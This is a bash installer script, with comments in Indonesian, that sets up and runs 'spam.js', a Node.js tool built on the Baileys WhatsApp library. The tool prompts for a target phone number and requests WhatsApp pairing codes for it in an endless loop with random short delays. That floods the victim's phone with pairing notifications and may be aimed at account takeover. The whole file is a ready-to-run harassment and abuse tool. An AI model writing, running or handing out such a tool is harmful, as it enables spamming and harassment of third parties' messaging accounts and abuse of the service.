#!/bin/bash

# Cek Node.js
if ! command -v node &> /dev/null; then
  pkg install -y nodejs -y
fi

mkdir -p $HOME/pairing-loop
cd $HOME/pairing-loop

# Buat package.json kalau belum ada
if [ ! -f "package.json" ]; then
cat <<EOF > package.json
{
  "name": "pairing-loop",
  "version": "1.0.0",
  "main": "spam.js",
  "type": "module",
  "dependencies": {
    "@whiskeysockets/baileys": "^6.7.1"
  }
}
EOF
fi

# Buat file spam.js otomatis
cat <<'EOF' > spam.js
import makeWASocket, { fetchLatestBaileysVersion, makeInMemoryStore } from "@whiskeysockets/baileys"
import readline from "readline"

const rl = readline.createInterface({
  input: process.stdin,
  output: process.stdout
})

function getRandomDelay(min, max) {
  return Math.floor(Math.random() * (max - min + 1)) + min
}

async function startLoop() {
  const { version } = await fetchLatestBaileysVersion()

  rl.question("MASUKAN NOMOR TARGET (62): ", async (number) => {
    console.log("════════════════════════════════════")
    console.log("     PAIRING CODE LOOP (UNLIMITED)")
    console.log("Ketik 'Q' lalu ENTER untuk berhenti")
    console.log("════════════════════════════════════")

    let stop = false
    let count = 0

    // Listener input untuk berhenti
    rl.on("line", (input) => {
      if (input.trim().toUpperCase() === "Q") {
        stop = true
        console.log("════════════════════════════════════")
        console.log(`Loop dihentikan oleh user (Q). Total code: ${count}`)
        console.log("════════════════════════════════════")
        rl.close()
      }
    })

    while (!stop) {
      try {
        // Socket ephemeral (tanpa session permanen)
        const sock = makeWASocket({
          version,
          auth: {
            creds: { noiseKey: { private: Buffer.alloc(32), public: Buffer.alloc(32) }, signedIdentityKey: { private: Buffer.alloc(32), public: Buffer.alloc(32) }, signedPreKey: { keyPair: { private: Buffer.alloc(32), public: Buffer.alloc(32) }, signature: Buffer.alloc(32), keyId: 1 }, registrationId: Math.floor(Math.random() * 16384), advSecretKey: Buffer.alloc(32).toString("base64"), nextPreKeyId: 1, firstUnuploadedPreKeyId: 1, accountSettings: { unarchiveChats: false }, account: { details: Buffer.alloc(32), accountSignatureKey: Buffer.alloc(32), accountSignature: Buffer.alloc(32), deviceSignature: Buffer.alloc(32) }, me: { id: "0@s.whatsapp.net", name: "dummy" }, signalIdentities: [], lastAccountSyncTimestamp: 0, platformType: "smba", lastPreKeyId: 1 },
            keys: {}
          },
          printQRInTerminal: false
        })

        const code = await sock.requestPairingCode(number)
        count++
        console.log(`[${count}] Pairing Code: ${code}`)

        const delay = getRandomDelay(1000, 5000)
        console.log(`   → jeda ${delay / 1000} detik...`)
        await new Promise(r => setTimeout(r, delay))

      } catch (e) {
        console.log("Terjadi error:", e.message)
      }
    }

    process.exit(0)
  })
}

startLoop()
EOF

# Install dependencies (sekali saja cukup)
npm install

# Jalankan loop pairing
node spam.js